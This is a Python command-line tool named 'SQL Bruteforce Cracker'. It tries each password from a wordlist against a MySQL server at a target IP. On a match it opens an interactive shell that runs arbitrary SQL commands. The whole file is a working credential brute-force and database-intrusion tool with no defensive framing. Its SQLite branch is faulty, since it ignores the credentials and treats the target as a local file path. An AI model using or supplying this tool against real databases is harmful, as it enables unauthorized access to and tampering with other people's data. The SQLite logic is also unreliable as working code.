import argparse
import mysql.connector
import sqlite3
import time
from colorama import Fore, Style
from itertools import cycle

def try_mysql_connection(username, password, target_ip):
    try:
        conn = mysql.connector.connect(
            host=target_ip,
            user=username,
            password=password,
            database='mysql',  # Using 'mysql' to check the connection
        )
        return conn
    except mysql.connector.Error as err:
        return None

def try_sqlite_connection(username, password, target_ip):
    try:
        conn = sqlite3.connect(target_ip)  # SQLite doesn't require credentials for connection
        return conn
    except sqlite3.Error as err:
        return None

def execute_commands(conn):
    print(Fore.GREEN + "Connection successful! You can now execute commands.")
    while True:
        command = input("SQL Command: ")
        if command.lower() == 'exit':
            break
        try:
            cursor = conn.cursor()
            cursor.execute(command)
            result = cursor.fetchall()
            for row in result:
                print(row)
        except Exception as e:
            print(Fore.RED + f"Error executing command: {e}")

def brute_force_sql(username, password_list, target_ip, db_type):
    password_found = False
    for password in password_list:
        print(Fore.YELLOW + f"Trying Passphrase: {password}")
        if db_type == 'mysql':
            conn = try_mysql_connection(username, password, target_ip)
        elif db_type == 'sqlite3':
            conn = try_sqlite_connection(username, password, target_ip)

        if conn:
            print(Fore.GREEN + f"KEY FOUND: [{password}]")
            password_found = True
            execute_commands(conn)
            break
        time.sleep(1)  # Just to avoid flooding the target with requests

    if not password_found:
        print(Fore.RED + "KEY NOT FOUND")

def main():
    parser = argparse.ArgumentParser(description="SQL Bruteforce Cracker")
    parser.add_argument('-l', '--username', required=True, help="Username to use for login")
    parser.add_argument('-P', '--passwordlist', required=True, help="Path to the password list")
    parser.add_argument('target', help="Target SQL database address (IP)")
    parser.add_argument('-t', '--db_type', choices=['mysql', 'sqlite3'], required=True, help="Type of SQL database")

    args = parser.parse_args()

    try:
        with open(args.passwordlist, 'r') as file:
            password_list = file.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "Password list file not found.")
        return

    brute_force_sql(args.username, password_list, args.target, args.db_type)

if __name__ == '__main__':
    main()
